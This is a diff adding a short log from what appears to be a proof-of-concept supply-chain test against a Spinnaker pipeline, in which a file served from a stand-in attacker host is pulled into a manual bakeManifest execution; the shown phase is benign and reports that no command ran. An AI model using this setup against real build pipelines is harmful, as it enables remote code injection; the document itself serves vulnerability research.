@@ -1,0 +1,19 @@
+[attacker] wrote supply_poc/supply_benign.yaml
+[attacker]   -> served at http://evil.example.com:8000/supply.yaml (263 bytes)
+[attacker]   no Spinnaker credentials were used, and none are needed.
+------------------------------------------------------------------
+### PHASE A - attacker serves innocuous content
+[victim] a normal operator clicks 'Start Manual Execution'...
+         POST http://localhost:8084/pipelines/v2/rosco-poc/rosco-poc-supply
+         {"eventId":"12633770-b006-413d-b285-06129dfffebd","ref":"/pipelines/01M2W58SXGRYWFG527D773J908"}
+         HTTP=202
+         (202 is gate's optimistic return - it does NOT mean orca accepted it)
+--- gate: most recent executions --------------------------------
+  exec 01M2VVNTHFYSBHS3N585TW4GRN | rosco-poc-pipeline | SUCCEEDED  | origin=unknown | trigger=manual
+      stage 1 bakeManifest   -> SUCCEEDED
+  exec 01M2VW1MZ3SJ7D04ZZNK834NCC | rosco-poc-pipeline | SUCCEEDED  | origin=api    | trigger=manual
+      stage 1 bakeManifest   -> SUCCEEDED
+  exec 01M2VW3DQPB6M56GTR40BF2HQB | rosco-poc-pipeline | SUCCEEDED  | origin=api    | trigger=manual
+      stage 1 bakeManifest   -> SUCCEEDED
+--- rosco pod: hook side effect ---------------------------------
+  [ok] /tmp/SUPPLY_CHAIN_PROOF.txt absent - no command executed
